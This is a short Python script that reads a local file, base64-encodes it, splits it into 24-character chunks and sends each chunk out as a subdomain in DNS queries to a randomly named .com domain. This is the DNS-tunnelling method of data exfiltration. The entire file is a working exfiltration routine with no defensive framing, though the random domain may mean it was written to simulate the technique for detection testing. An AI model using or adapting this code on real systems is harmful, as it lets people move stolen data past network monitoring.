

import base64 
import socket
import dns.resolver
import random
import string

def randStr(chars = string.ascii_lowercase, N=10):
	return ''.join(random.choice(chars) for _ in range(N))

dns.resolver.Timeout = 1
dns.resolver.lifetime = 1

DOMAIN = "." + randStr(N=10) + ".com"

data = open('data.txt', 'rb') #open binary file in read mode
data_read = data.read()
encodedBytes = base64.b64encode(data_read)
encodedStr = str(encodedBytes, "utf-8") #converts Base64 to string from bytes

parse = [encodedStr[i:i+24] for i in range(0, len(encodedStr), 24)] #breaks the base64 text file into 24 character chunks and passes to parse

ctr = 0
for chunk in parse:
    try:
        print(dns.resolver.query(parse[ctr]+DOMAIN)) #query DNS Domain
    except (dns.resolver.NoAnswer):
        print("Couldn't find any records (NoAnswer)") #Error handling on Timeout
    except (dns.resolver.NXDOMAIN):
        print("Couldn't find any records (NXDOMAIN): " + parse[ctr]+DOMAIN) #Error handling if DNS is cached on host and cant find.
    ctr = ctr + 1